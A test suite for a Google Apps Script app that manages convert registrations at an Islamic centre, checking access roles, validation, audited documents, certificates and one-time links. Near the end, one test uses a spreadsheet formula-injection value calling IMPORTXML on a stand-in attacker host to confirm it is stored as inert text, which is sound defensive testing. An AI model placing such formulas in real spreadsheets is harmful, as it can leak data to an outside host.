// Security and behaviour tests for the real server code, run against in-memory Google services.
// Every person, number and document here is fictional.
// Run: node tests/server.test.mjs
import assert from 'node:assert/strict'
import { loadServer } from './mock-gas.mjs'

const SUP = 'supervisor@example.com'
const MA = 'maestro.ahmad@example.com'
const MB = 'maestro.omar@example.com'
const COL = 'colaborador.uno@example.com'
const s = loadServer({ ownerEmail: SUP })
const { call } = s
let n = 0
const ok = (r) => { assert.equal(r.ok, true, JSON.stringify(r.error)); n++; return r.data }
const denied = (r, code) => { assert.equal(r.ok, false, 'expected refusal, got ' + JSON.stringify(r.data)); assert.equal(r.error.code, code, r.error.message); n++ }
const pub = (action, payload) => JSON.parse(s.ctx.doPost({ postData: { contents: JSON.stringify({ action, payload }) } })._text)

const JPG = 'data:image/jpeg;base64,' + Buffer.from([0xff, 0xd8, 0xff, 0xe0, 1, 2, 3, 4]).toString('base64')
const PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=='
const FAKE_JPG = 'data:image/jpeg;base64,' + Buffer.from('not an image at all').toString('base64')

// --- before setup nothing works; setup is idempotent
denied(call(SUP, 'me'), 'NOT_CONFIGURED')
s.ctx.setup()
s.ctx.setup()
assert.equal(s.spreadsheets.size, 1)

// --- sign-in
assert.equal(ok(call(SUP, 'me')).user.role, 'supervisor')
denied(call('stranger.person@example.com', 'me'), 'NOT_REGISTERED')
denied(call(null, 'me', {}, ''), 'UNAUTHENTICATED')
denied(call(null, 'me', {}, 'forged-token-that-google-rejects'), 'UNAUTHENTICATED')
denied(call(null, 'me', {}, `dev.${SUP}|aud`), 'UNAUTHENTICATED')
denied(call(null, 'me', {}, `dev.${SUP}|expired`), 'UNAUTHENTICATED')
denied(call(null, 'me', {}, `dev.${SUP}|unverified`), 'UNAUTHENTICATED')
denied(call('stranger.person@example.com', 'no.such.action'), 'NOT_REGISTERED') // auth comes first
denied(call(SUP, 'no.such.action'), 'BAD_ACTION')
denied(call(SUP, 'constructor'), 'BAD_ACTION')
denied(call(SUP, 'hasOwnProperty'), 'BAD_ACTION')

// --- starting lists from setup
const cat0 = ok(call(SUP, 'catalogo'))
assert.ok(cat0.nacionalidades.some((x) => x.nombre === 'Argentina'))
assert.ok(cat0.etapas.length >= 5)
assert.equal(cat0.campos.find((f) => f.key === 'nombres').requerido, true)

// --- sheikhs: with an e-mail they can sign in
const ma = ok(call(SUP, 'maestros.save', { nombre: 'Sheij Ahmad', email: MA, alias: 'Ahmad, Ahmed', telefono: '11 2345 6789' }))
const mb = ok(call(SUP, 'maestros.save', { nombre: 'Sheij Omar', email: MB }))
const mc = ok(call(SUP, 'maestros.save', { nombre: 'Sheij Yusuf' })) // no account: only a name
assert.equal(ma.telefono, '+5491123456789')
denied(call(SUP, 'maestros.save', { nombre: 'Otro', email: MA }), 'BAD_INPUT') // e-mail taken
denied(call(MA, 'maestros.save', { nombre: 'Yo mismo' }), 'FORBIDDEN')
assert.equal(ok(call(MA, 'me')).user.role, 'maestro')
assert.equal(ok(call(MA, 'me')).maestro.id, ma.id)

// --- colaborador: an employee who only registers
ok(call(SUP, 'usuarios.save', { email: COL, role: 'colaborador' }))
denied(call(SUP, 'usuarios.save', { email: MA, role: 'colaborador' }), 'BAD_INPUT') // already a maestro
denied(call(SUP, 'maestros.save', { nombre: 'X', email: COL }), 'BAD_INPUT') // already a colaborador
assert.equal(ok(call(COL, 'me')).user.role, 'colaborador')
const catCol = ok(call(COL, 'catalogo'))
assert.deepEqual(Object.keys(catCol.maestros[0]).sort(), ['active', 'id', 'nombre']) // names only
assert.equal(catCol.etapas.length, 0)

// --- registering
const base = (extra = {}) => ({ nombres: 'Juan', apellidos: 'Pérez', sexo: 'M', nacionalidad: 'Argentina', whatsapp: '11 15 2345 6789', maestroId: ma.id, ...extra })
const c1 = ok(call(SUP, 'conversos.create', { data: base({ tipoDocumento: 'DNI', numeroDocumento: '30.111.222', fechaShahada: '2025-05-02', consentimientoContacto: true }) }))
assert.match(c1.id, /^NM-\d{4}-0001$/)
const full1 = ok(call(SUP, 'conversos.get', { id: c1.id })).converso
assert.equal(full1.whatsapp, '+5491123456789')
assert.equal(full1.numeroDocumento, '30111222')
assert.equal(full1.consentimientoContacto, '1')
assert.ok(full1.fechaConsentimiento)
assert.equal(full1.maestroNombre, 'Sheij Ahmad')
assert.equal(full1.formKey, undefined)

// required fields, bad values
denied(call(SUP, 'conversos.create', { data: base({ nombres: '' }) }), 'BAD_INPUT')
denied(call(SUP, 'conversos.create', { data: base({ sexo: '' }) }), 'BAD_INPUT')
denied(call(SUP, 'conversos.create', { data: base({ sexo: 'X' }) }), 'BAD_INPUT')
denied(call(SUP, 'conversos.create', { data: base({ nacionalidad: 'Atlántida' }) }), 'BAD_INPUT')
denied(call(SUP, 'conversos.create', { data: base({ whatsapp: '123' }) }), 'BAD_INPUT')
denied(call(SUP, 'conversos.create', { data: base({ maestroId: 'm-does-not-exist' }) }), 'BAD_INPUT')
denied(call(SUP, 'conversos.create', { data: base({ fechaShahada: '2099-01-01' }) }), 'BAD_INPUT')
denied(call(SUP, 'conversos.create', { data: base({ tipoDocumento: 'DNI', numeroDocumento: 'ABC' }) }), 'BAD_INPUT')
denied(call(SUP, 'conversos.create', { data: base({ diasDisponibles: ['feriado'] }) }), 'BAD_INPUT')
denied(call(SUP, 'conversos.create', { data: base({ resumenVida: 'x'.repeat(5001) }) }), 'BAD_INPUT')
denied(call(SUP, 'conversos.create', { data: base(), documentos: [{ tipo: 'dni_frente', dataUrl: FAKE_JPG }] }), 'BAD_INPUT')
denied(call(SUP, 'conversos.create', { data: base(), documentos: [{ tipo: 'secreto', dataUrl: JPG }] }), 'BAD_INPUT')
assert.equal(ok(call(SUP, 'conversos.list', {})).length, 1, 'refused registrations leave nothing behind')

// a foreign number with its country code
const c2 = ok(call(SUP, 'conversos.create', { data: base({ nombres: 'María', sexo: 'F', nacionalidad: 'Venezuela', codigoPais: '58', whatsapp: '0412 1234567', maestroId: mb.id, diasDisponibles: ['viernes', 'lunes'] }) }))
const full2 = ok(call(SUP, 'conversos.get', { id: c2.id })).converso
assert.equal(full2.whatsapp, '+584121234567')
assert.equal(full2.diasDisponibles, 'lunes,viernes')

// the colaborador registers and gets NOTHING back about the record
const r = ok(call(COL, 'conversos.create', { data: base({ nombres: 'Pedro', whatsapp: '11 3333 4444', maestroId: mb.id }), documentos: [{ tipo: 'dni_frente', dataUrl: JPG }] }))
assert.deepEqual(r, { registrado: true })
denied(call(COL, 'conversos.list', {}), 'FORBIDDEN')
denied(call(COL, 'conversos.get', { id: c1.id }), 'FORBIDDEN')
denied(call(COL, 'conversos.update', { id: c1.id, data: { nombres: 'X' } }), 'FORBIDDEN')
denied(call(COL, 'documentos.get', { id: 'd1' }), 'FORBIDDEN')
denied(call(COL, 'resumen'), 'FORBIDDEN')
denied(call(COL, 'export.conversos', {}), 'FORBIDDEN')
denied(call(COL, 'invitaciones.create', {}), 'FORBIDDEN')
denied(call(COL, 'certificados.list'), 'FORBIDDEN')
denied(call(COL, 'seguimiento.add', { conversoId: c1.id, resumen: 'x' }), 'FORBIDDEN')
denied(call(COL, 'settings.get'), 'FORBIDDEN')
const pedro = ok(call(SUP, 'conversos.list', { q: 'pedro' }))[0]
assert.equal(pedro.origen, 'colaborador')
assert.equal(pedro.maestroId, mb.id)
assert.equal(ok(call(SUP, 'conversos.get', { id: pedro.id })).documentos.length, 1)

// --- a maestro sees and changes only the records assigned to him
assert.deepEqual(ok(call(MA, 'conversos.list', {})).map((x) => x.id), [c1.id])
assert.deepEqual(ok(call(MB, 'conversos.list', {})).map((x) => x.id).sort(), [c2.id, pedro.id].sort())
denied(call(MA, 'conversos.get', { id: c2.id }), 'NOT_FOUND') // "not yours" looks like "not found"
denied(call(MA, 'conversos.get', { id: 'NM-2026-9999' }), 'NOT_FOUND')
denied(call(MA, 'conversos.update', { id: c2.id, data: { notas: 'x' } }), 'NOT_FOUND')
denied(call(MA, 'conversos.setEstado', { id: c2.id, estado: 'archivado' }), 'NOT_FOUND')
denied(call(MA, 'seguimiento.add', { conversoId: c2.id, resumen: 'x' }), 'NOT_FOUND')
denied(call(MA, 'documentos.upload', { conversoId: c2.id, tipo: 'foto', dataUrl: JPG }), 'NOT_FOUND')
denied(call(MA, 'certificados.issue', { conversoId: c2.id }), 'NOT_FOUND')
denied(call(MA, 'conversos.delete', { id: c1.id, confirm: true }), 'FORBIDDEN') // only the supervisor deletes
denied(call(MA, 'conversos.revisado', { id: c1.id }), 'FORBIDDEN')
denied(call(MA, 'export.conversos', {}), 'FORBIDDEN')
denied(call(MA, 'maestros.list'), 'FORBIDDEN')
denied(call(MA, 'usuarios.list'), 'FORBIDDEN')
denied(call(MA, 'auditoria.list'), 'FORBIDDEN')
// searching by a number never reveals another sheikh's record
assert.equal(ok(call(MA, 'conversos.list', { q: '4121234567' })).length, 0)
assert.equal(ok(call(SUP, 'conversos.list', { q: '4121234567' })).length, 1)
assert.equal(ok(call(SUP, 'conversos.list', { q: '30111222' })).length, 1)
// lists carry no document number
assert.equal(ok(call(SUP, 'conversos.list', {}))[0].numeroDocumento, undefined)

// a maestro registering keeps the record under his own name, whatever he sends
const c3 = ok(call(MA, 'conversos.create', { data: base({ nombres: 'Ali', whatsapp: '11 5555 6666', maestroId: mb.id }) }))
assert.equal(ok(call(MA, 'conversos.get', { id: c3.id })).converso.maestroId, ma.id)
ok(call(MA, 'conversos.update', { id: c3.id, data: { maestroId: mb.id, resumenVida: 'Llegó por un amigo.' } }))
assert.equal(ok(call(MA, 'conversos.get', { id: c3.id })).converso.maestroId, ma.id, 'a maestro cannot hand a record to someone else')
// the supervisor reassigns
ok(call(SUP, 'conversos.update', { id: c3.id, data: { maestroId: mb.id } }))
denied(call(MA, 'conversos.get', { id: c3.id }), 'NOT_FOUND')
ok(call(MB, 'conversos.get', { id: c3.id }))
// updating only touches what is sent; a required field cannot be emptied
ok(call(SUP, 'conversos.update', { id: c1.id, data: { notas: 'Nota interna' } }))
assert.equal(ok(call(SUP, 'conversos.get', { id: c1.id })).converso.nombres, 'Juan')
denied(call(SUP, 'conversos.update', { id: c1.id, data: { nombres: '' } }), 'BAD_INPUT')

// --- duplicates are flagged, never refused (refusing would tell a colaborador the person exists)
ok(call(COL, 'conversos.create', { data: base({ nombres: 'Juan otra vez', tipoDocumento: 'DNI', numeroDocumento: '30111222', whatsapp: '11 7777 8888' }) }))
const dupe = ok(call(SUP, 'conversos.list', { q: 'otra vez' }))[0]
assert.equal(dupe.revisar, true)
assert.match(ok(call(SUP, 'conversos.get', { id: dupe.id })).converso.revisar, new RegExp('Posible duplicado de ' + c1.id))
ok(call(SUP, 'conversos.revisado', { id: dupe.id }))
assert.equal(ok(call(SUP, 'conversos.get', { id: dupe.id })).converso.revisar, '')

// --- follow-up and progress
const seg = ok(call(MA, 'seguimiento.add', { conversoId: c1.id, tipo: 'llamada', resumen: 'Hablamos sobre la oración.', proximaAccion: 'Clase de wudu', proximaFecha: new Date(Date.now() + 2 * 86400000).toISOString().slice(0, 10) }))
denied(call(MA, 'seguimiento.add', { conversoId: c1.id, tipo: 'fax', resumen: 'x' }), 'BAD_INPUT')
denied(call(MA, 'seguimiento.add', { conversoId: c1.id, resumen: '' }), 'BAD_INPUT')
denied(call(MA, 'seguimiento.add', { conversoId: c1.id, resumen: 'x', fecha: '2099-01-01' }), 'BAD_INPUT')
assert.equal(ok(call(MA, 'resumen')).proximas.length, 1)
const etapa = cat0.etapas[0]
ok(call(MA, 'progreso.set', { conversoId: c1.id, etapaId: etapa.id, hecho: true }))
ok(call(MA, 'progreso.set', { conversoId: c1.id, etapaId: etapa.id, hecho: true })) // no double tick
assert.equal(ok(call(MA, 'conversos.get', { id: c1.id })).progreso.length, 1)
denied(call(MA, 'progreso.set', { conversoId: c1.id, etapaId: 'nope', hecho: true }), 'NOT_FOUND')
// a note is deleted by its author or the supervisor
const segB = ok(call(SUP, 'seguimiento.add', { conversoId: c1.id, resumen: 'Nota del supervisor' }))
denied(call(MA, 'seguimiento.delete', { id: segB.id }), 'FORBIDDEN')
ok(call(MA, 'seguimiento.delete', { id: seg.id }))
ok(call(SUP, 'seguimiento.delete', { id: segB.id }))

// --- identity documents: private, and every opening is audited
const doc = ok(call(MA, 'documentos.upload', { conversoId: c1.id, tipo: 'dni_frente', dataUrl: JPG }))
denied(call(MA, 'documentos.upload', { conversoId: c1.id, tipo: 'dni_frente', dataUrl: FAKE_JPG }), 'BAD_INPUT')
denied(call(MB, 'documentos.get', { id: doc.id }), 'NOT_FOUND')
assert.equal(ok(call(MA, 'documentos.get', { id: doc.id })).dataUrl, JPG)
assert.ok(ok(call(SUP, 'auditoria.list')).some((a) => a.accion === 'ver_documento' && a.email === MA))
assert.equal(s.shared.length, 0, 'no file is ever shared')

// --- supervisor preview as a maestro: read only
const prev = JSON.parse(s.ctx.doPost({ postData: { contents: JSON.stringify({ token: 'dev.' + SUP, action: 'conversos.list', payload: {}, asMaestro: ma.id }) } })._text)
assert.equal(prev.ok, true)
assert.deepEqual(prev.data.map((x) => x.id).sort(), [c1.id, dupe.id].sort())
n++
const prevW = JSON.parse(s.ctx.doPost({ postData: { contents: JSON.stringify({ token: 'dev.' + SUP, action: 'conversos.update', payload: { id: c1.id, data: { notas: 'x' } }, asMaestro: ma.id }) } })._text)
denied(prevW, 'PREVIEW_READONLY')
denied(JSON.parse(s.ctx.doPost({ postData: { contents: JSON.stringify({ token: 'dev.' + MA, action: 'conversos.list', payload: {}, asMaestro: mb.id }) } })._text), 'FORBIDDEN')

// --- certificates
denied(call(MA, 'certificados.issue', { conversoId: c3.id }), 'NOT_FOUND')
const noDate = ok(call(SUP, 'conversos.create', { data: base({ nombres: 'Sin fecha', whatsapp: '11 4444 1111' }) }))
denied(call(SUP, 'certificados.issue', { conversoId: noDate.id }), 'BAD_INPUT') // needs the date of the shahada
denied(call(MA, 'certificados.issue', { conversoId: c1.id, idioma: 'fr' }), 'BAD_INPUT')
const cert = ok(call(MA, 'certificados.issue', { conversoId: c1.id, emisor: 'maestro', idioma: 'es' }))
assert.match(cert.numero, /^C-\d{4}-0001$/)
const cert2 = ok(call(SUP, 'certificados.issue', { conversoId: c1.id, emisor: 'centro', idioma: 'es_ar' }))
assert.match(cert2.numero, /^C-\d{4}-0002$/)
ok(call(MA, 'firma.save', { maestroId: ma.id, dataUrl: PNG }))
denied(call(MA, 'firma.save', { maestroId: mb.id, dataUrl: PNG }), 'FORBIDDEN')
denied(call(MA, 'firma.save', { maestroId: ma.id, dataUrl: JPG }), 'BAD_INPUT')
const got = ok(call(MA, 'certificados.get', { id: cert.id }))
assert.equal(got.datos.nombre, 'Juan Pérez')
assert.equal(got.datos.emisorTexto, 'Sheij Ahmad')
assert.equal(got.firma, PNG)
assert.equal(ok(call(SUP, 'certificados.get', { id: cert2.id })).datos.emisorTexto, 'Centro Islámico')
// the printed data is frozen: editing the record later does not change an issued certificate
ok(call(SUP, 'conversos.update', { id: c1.id, data: { nombres: 'Juan Carlos' } }))
assert.equal(ok(call(MA, 'certificados.get', { id: cert.id })).datos.nombre, 'Juan Pérez')
denied(call(MB, 'certificados.get', { id: cert.id }), 'NOT_FOUND')
assert.equal(ok(call(MB, 'certificados.list')).length, 0)
denied(call(MA, 'certificados.annul', { id: cert.id }), 'BAD_INPUT') // needs a reason
ok(call(MA, 'certificados.annul', { id: cert.id, motivo: 'Error en el nombre' }))
denied(call(MA, 'certificados.annul', { id: cert.id, motivo: 'otra vez' }), 'BAD_INPUT')
assert.equal(ok(call(SUP, 'certificados.list')).find((x) => x.id === cert.id).estado, 'anulado')

// --- one-time registration link (no sign-in)
denied(call(MA, 'invitaciones.create', {}), 'NOT_CONFIGURED') // needs the app address first
denied(call(SUP, 'settings.save', { appUrl: 'http://example.com' }), 'BAD_INPUT')
ok(call(SUP, 'settings.save', { appUrl: 'https://app.example.org/' }))
denied(call(MA, 'invitaciones.create', { telefono: '12' }), 'BAD_INPUT')
const inv = ok(call(MA, 'invitaciones.create', { telefono: '11 2222 3333', nota: 'Shahada por videollamada', maestroId: mb.id }))
assert.match(inv.url, /^https:\/\/app\.example\.org\/#r=[a-f0-9]{64}$/)
assert.match(inv.waUrl, /^https:\/\/wa\.me\/5491122223333\?text=/)
const token = inv.url.split('#r=')[1]
// only a hash of the token is stored
const invRows = [...s.spreadsheets.values()][0]._sheets.get('Invitaciones')._data
assert.ok(!JSON.stringify(invRows).includes(token))
assert.equal(ok(call(MA, 'invitaciones.list'))[0].maestroId, ma.id, 'a maestro invites under his own name')
assert.equal(ok(call(MB, 'invitaciones.list')).length, 0)
assert.equal(ok(call(MA, 'invitaciones.list'))[0].token, undefined)

// the public page sees only the link's fields and lists, nothing about anyone
const form = ok(pub('public.form', { token }))
assert.equal(form.org, 'Centro Islámico')
assert.ok(!form.campos.some((f) => f.key === 'maestroId' || f.key === 'notas'))
assert.equal(form.maestros, undefined)
denied(pub('public.form', { token: 'f'.repeat(64) }), 'INVALID_LINK')
denied(pub('public.form', { token: 'short' }), 'INVALID_LINK')
denied(pub('public.form', {}), 'INVALID_LINK')
// a public call cannot reach any signed-in action
denied(pub('conversos.list', {}), 'UNAUTHENTICATED')
denied(pub('public.nothing', {}), 'UNAUTHENTICATED')
// submitting: same checks as inside the app, then the link is spent
denied(pub('public.submit', { token, data: { nombres: '' } }), 'BAD_INPUT')
denied(pub('public.submit', { token, data: base({ nombres: 'Remoto' }), documentos: [{ tipo: 'dni_frente', dataUrl: FAKE_JPG }] }), 'BAD_INPUT')
const sent = ok(pub('public.submit', { token, data: base({ nombres: 'Remoto', apellidos: 'Lejos', whatsapp: '11 2222 3333', notas: 'intento de nota', maestroId: mb.id }), documentos: [{ tipo: 'pasaporte', dataUrl: JPG }] }))
assert.deepEqual(sent, { registrado: true })
denied(pub('public.submit', { token, data: base({ nombres: 'Otra vez' }) }), 'INVALID_LINK')
denied(pub('public.form', { token }), 'INVALID_LINK')
const remote = ok(call(MA, 'conversos.list', { q: 'remoto' }))[0]
assert.equal(remote.origen, 'enlace')
assert.equal(remote.maestroId, ma.id, 'assigned to the sheikh who sent the link, not to what the form says')
const remoteFull = ok(call(MA, 'conversos.get', { id: remote.id }))
assert.equal(remoteFull.converso.notas, '', 'internal fields cannot be filled through the link')
assert.equal(remoteFull.documentos.length, 1)
assert.equal(ok(call(MA, 'invitaciones.list'))[0].estado, 'usada')
assert.equal(ok(call(MA, 'invitaciones.list'))[0].conversoId, remote.id)
// revoked and expired links
const inv2 = ok(call(MA, 'invitaciones.create', {}))
denied(call(MB, 'invitaciones.revoke', { id: inv2.id }), 'NOT_FOUND')
ok(call(MA, 'invitaciones.revoke', { id: inv2.id }))
denied(pub('public.form', { token: inv2.url.split('#r=')[1] }), 'INVALID_LINK')
const inv3 = ok(call(SUP, 'invitaciones.create', { maestroId: mb.id }))
const row3 = invRows.find((r) => r[0] === inv3.id)
row3[7] = new Date(Date.now() - 1000).toISOString() // expira
denied(pub('public.form', { token: inv3.url.split('#r=')[1] }), 'INVALID_LINK')

// records without a sheikh can be listed on their own (the link above had none)
assert.ok(ok(call(SUP, 'conversos.list', { sinMaestro: true })).every((c) => !c.maestroId))
assert.equal(ok(call(MA, 'conversos.list', { sinMaestro: true })).length, 0)

// --- the supervisor configures the fields
denied(call(SUP, 'camposBase.save', { key: 'nombres', requerido: false, active: false }), 'BAD_INPUT') // always required
ok(call(SUP, 'camposBase.save', { key: 'sexo', requerido: false, enEnlace: true, active: true }))
ok(call(SUP, 'conversos.create', { data: base({ nombres: 'Sin sexo', sexo: '', whatsapp: '11 1212 3434' }) }))
ok(call(SUP, 'camposBase.save', { key: 'fechaNacimiento', requerido: true, enEnlace: true, active: true }))
denied(call(SUP, 'conversos.create', { data: base({ nombres: 'Sin nacimiento', whatsapp: '11 1212 5656' }) }), 'BAD_INPUT')
ok(call(SUP, 'camposBase.save', { key: 'fechaNacimiento', requerido: false, enEnlace: true, active: true }))
// custom fields: a fiqh topic with its explanation, a cultural detail
denied(call(MA, 'campos.save', { etiqueta: 'x', tipo: 'text' }), 'FORBIDDEN')
denied(call(SUP, 'campos.save', { etiqueta: 'x', tipo: 'html' }), 'BAD_INPUT')
denied(call(SUP, 'campos.save', { etiqueta: 'Idioma', tipo: 'choice', opciones: ['uno'] }), 'BAD_INPUT')
const campos = ok(call(SUP, 'campos.save', { etiqueta: 'Idioma materno', etiquetaAr: 'اللغة الأم', tipo: 'choice', opciones: ['Español', 'Portugués', 'Guaraní'], requerido: true, enEnlace: true, seccion: 'personal', ayuda: 'El idioma en que prefiere aprender.' }))
const idioma = campos.find((f) => f.etiqueta === 'Idioma materno')
ok(call(SUP, 'campos.save', { etiqueta: 'Explicamos el ghusl', tipo: 'yesno', seccion: 'islam', ayuda: 'Marcar cuando se explicó el baño ritual.', enEnlace: false }))
denied(call(SUP, 'conversos.create', { data: base({ nombres: 'Sin idioma', whatsapp: '11 9898 7676' }) }), 'BAD_INPUT')
denied(call(SUP, 'conversos.create', { data: base({ nombres: 'Mal idioma', whatsapp: '11 9898 7676', extra: { [idioma.key]: 'Klingon' } }) }), 'BAD_INPUT')
const cx = ok(call(SUP, 'conversos.create', { data: base({ nombres: 'Con idioma', whatsapp: '11 9898 7676', extra: { [idioma.key]: 'Guaraní' } }) }))
assert.equal(ok(call(SUP, 'conversos.get', { id: cx.id })).converso.extra[idioma.key], 'Guaraní')
denied(call(SUP, 'campos.save', { id: idioma.key, etiqueta: 'Idioma', tipo: 'text' }), 'BAD_INPUT') // type is fixed
// the public link shows a custom field only when marked for it
const inv4 = ok(call(SUP, 'invitaciones.create', { maestroId: ma.id }))
const form4 = ok(pub('public.form', { token: inv4.url.split('#r=')[1] }))
assert.ok(form4.campos.some((f) => f.key === idioma.key))
assert.ok(!form4.campos.some((f) => f.etiqueta === 'Explicamos el ghusl'))
// turning a field off makes it optional and hidden
ok(call(SUP, 'campos.save', { id: idioma.key, etiqueta: 'Idioma materno', tipo: 'choice', opciones: ['Español', 'Portugués', 'Guaraní'], active: false }))
ok(call(SUP, 'conversos.create', { data: base({ nombres: 'Ya no hace falta', whatsapp: '11 9898 1212' }) }))

// --- nationalities: renaming follows the records; a disabled one is not offered in the link
const nat = ok(call(SUP, 'nacionalidades.save', { nombre: 'Marruecos' }))
denied(call(SUP, 'nacionalidades.save', { nombre: 'marruecos' }), 'BAD_INPUT')
const cm = ok(call(SUP, 'conversos.create', { data: base({ nombres: 'Yassin', nacionalidad: 'Marruecos', whatsapp: '11 6767 1212' }) }))
ok(call(SUP, 'nacionalidades.save', { id: nat.id, nombre: 'Marruecos (Reino)', active: false }))
assert.equal(ok(call(SUP, 'conversos.get', { id: cm.id })).converso.nacionalidad, 'Marruecos (Reino)')
assert.ok(!ok(call(COL, 'catalogo')).nacionalidades.some((x) => x.nombre.startsWith('Marruecos')))
assert.ok(!ok(pub('public.form', { token: inv4.url.split('#r=')[1] })).nacionalidades.some((x) => x.startsWith('Marruecos')))

// --- a sheikh who leaves is deactivated, never deleted; his records must move
denied(call(SUP, 'maestros.setActive', { id: mb.id, active: false }), 'BAD_INPUT') // has records
denied(call(SUP, 'maestros.setActive', { id: mb.id, active: false, reasignarA: mb.id }), 'BAD_INPUT')
ok(call(SUP, 'maestros.setActive', { id: mb.id, active: false, reasignarA: mc.id }))
denied(call(MB, 'me'), 'NOT_REGISTERED')
assert.equal(ok(call(SUP, 'conversos.get', { id: c2.id })).converso.maestroId, mc.id)
assert.ok(ok(call(SUP, 'catalogo')).maestros.some((m) => m.id === mb.id && !m.active), 'kept, shown as inactive')
assert.ok(!ok(call(COL, 'catalogo')).maestros.some((m) => m.id === mb.id))
denied(call(SUP, 'conversos.create', { data: base({ nombres: 'Nuevo', whatsapp: '11 1313 1414', maestroId: mb.id }) }), 'BAD_INPUT')
ok(call(SUP, 'maestros.setActive', { id: mb.id, active: true }))
assert.equal(ok(call(MB, 'me')).user.role, 'maestro')

// --- accounts
denied(call(SUP, 'usuarios.disable', { email: SUP }), 'BAD_INPUT') // never yourself
ok(call(SUP, 'usuarios.save', { email: 'otro.supervisor@example.com', role: 'supervisor' }))
ok(call(SUP, 'usuarios.disable', { email: COL }))
denied(call(COL, 'me'), 'NOT_REGISTERED')
ok(call(SUP, 'usuarios.save', { email: COL, role: 'colaborador', expiry: '2099-12-31' }))
assert.equal(ok(call(COL, 'me')).user.role, 'colaborador')
denied(call(SUP, 'usuarios.save', { email: COL, role: 'colaborador', expiry: '2020-01-01' }), 'BAD_INPUT')
const usersSheet = [...s.spreadsheets.values()][0]._sheets.get('Users')._data
usersSheet.find((u) => u[0] === COL)[4] = '2020-01-01' // expiry passed
denied(call(COL, 'me'), 'EXPIRED')

// --- export: supervisor only, Spanish or Arabic, audited
const ex = ok(call(SUP, 'export.conversos', { idioma: 'es' }))
assert.equal(ex.headers[0], 'N.º de registro')
assert.ok(ex.rows.length >= 8)
const exAr = ok(call(SUP, 'export.conversos', { idioma: 'ar' }))
assert.equal(exAr.headers[0], 'رقم السجل')
assert.ok(exAr.rows.some((row) => row.includes('ذكر')))
assert.ok(ok(call(SUP, 'auditoria.list')).filter((a) => a.accion === 'exportar_lista').length === 2)

// --- deleting a record (consent withdrawn): its files are trashed, certificates keep their number
const docsBefore = [...s.files.values()].filter((f) => !f._trashed).length
ok(call(SUP, 'conversos.delete', { id: c1.id, confirm: true }))
assert.ok([...s.files.values()].filter((f) => !f._trashed).length < docsBefore)
denied(call(SUP, 'conversos.get', { id: c1.id }), 'NOT_FOUND')
denied(call(SUP, 'conversos.delete', { id: c2.id }), 'BAD_INPUT') // needs confirmation
const certRows = [...s.spreadsheets.values()][0]._sheets.get('Certificados')._data.slice(1)
assert.ok(certRows.every((row) => row[7] === '{}' && row[8] === 'anulado'))

// --- text that looks like a formula is stored as plain text and read back unchanged
const evil = ok(call(SUP, 'conversos.create', { data: base({ nombres: '=IMPORTXML("https://evil.example","//a")', whatsapp: '11 4545 4545' }) }))
const rawRow = [...s.spreadsheets.values()][0]._sheets.get('Conversos')._data.find((row) => row[0] === evil.id)
assert.ok(rawRow[1].startsWith("'="), 'kept as text in the sheet')
assert.ok(rawRow[11].startsWith("'+"), 'the + of the phone survives')
assert.equal(ok(call(SUP, 'conversos.get', { id: evil.id })).converso.nombres, '=IMPORTXML("https://evil.example","//a")')
assert.equal(ok(call(SUP, 'conversos.get', { id: evil.id })).converso.whatsapp, '+5491145454545')

// --- settings
denied(call(SUP, 'settings.save', { invitacionDias: '90' }), 'BAD_INPUT')
assert.equal(ok(call(SUP, 'settings.save', { orgName: 'Mezquita de prueba', foo: 'bar' })).foo, undefined)

console.log(`server: ${n} checks passed`)
